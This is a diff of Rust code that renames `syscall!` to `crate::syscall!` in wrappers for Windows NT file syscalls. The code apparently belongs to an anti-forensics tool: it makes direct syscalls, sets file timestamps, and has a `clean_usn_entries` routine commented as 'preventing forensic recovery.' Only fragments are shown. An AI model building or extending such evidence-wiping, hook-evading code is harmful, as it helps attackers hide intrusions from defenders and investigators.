@@ -653,7 +653,7 @@ unsafe fn nt_open_file(
     let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
     let mut iosb = IoStatusBlock::default();
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtCreateFile",
         &mut handle as *mut _ as u64,
         desired_access as u64,
@@ -683,7 +683,7 @@ unsafe fn nt_close(handle: *mut std::ffi::c_void) -> Result<(), String> {
     if handle.is_null() {
         return Ok(());
     }
-    let status = syscall!("NtClose", handle as u64)
+    let status = crate::syscall!("NtClose", handle as u64)
         .map_err(|e| format!("nt_syscall resolution for NtClose: {e}"))?;
     if status != STATUS_SUCCESS {
         return Err(format!("NtClose failed: NTSTATUS {:#010X}", status as u32));
@@ -698,7 +698,7 @@ unsafe fn nt_query_basic_info(
     let mut info = FileBasicInformation::default();
     let mut iosb = IoStatusBlock::default();
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtQueryInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -724,7 +724,7 @@ unsafe fn nt_set_basic_info(
 ) -> Result<(), String> {
     let mut iosb = IoStatusBlock::default();
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtSetInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -750,7 +750,7 @@ unsafe fn nt_query_internal_info(
     let mut info = FileInternalInformation::default();
     let mut iosb = IoStatusBlock::default();
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtQueryInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -778,7 +778,7 @@ unsafe fn nt_read_file(
     let mut iosb = IoStatusBlock::default();
     let mut byte_offset = offset.unwrap_or(0);
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtReadFile",
         file_handle as u64,
         0u64,                              // Event
@@ -810,7 +810,7 @@ unsafe fn nt_write_file(
     let mut iosb = IoStatusBlock::default();
     let mut byte_offset = offset.unwrap_or(0);
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtWriteFile",
         file_handle as u64,
         0u64,                              // Event
@@ -844,7 +844,7 @@ unsafe fn nt_fs_control_file(
 ) -> Result<IoStatusBlock, String> {
     let mut iosb = IoStatusBlock::default();
 
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtFsControlFile",
         file_handle as u64,
         0u64,                              // Event
@@ -880,7 +880,7 @@ unsafe fn nt_enumerate_files(
     loop {
         let mut iosb = IoStatusBlock::default();
 
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtQueryDirectoryFile",
             dir_handle as u64,
             0u64,                              // Event
@@ -1368,7 +1368,7 @@ unsafe fn find_usn_entries_for_file(
 
         let mut iosb = IoStatusBlock::default();
 
-        let read_status = syscall!(
+        let read_status = crate::syscall!(
             "NtFsControlFile",
             volume_handle as u64,
             0u64,
@@ -1452,7 +1452,7 @@ unsafe fn clean_usn_entries(
         // cleanly marks the entry as closed, preventing forensic recovery.
         let mut iosb = IoStatusBlock::default();
 
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtFsControlFile",
             volume_handle as u64,
             0u64,
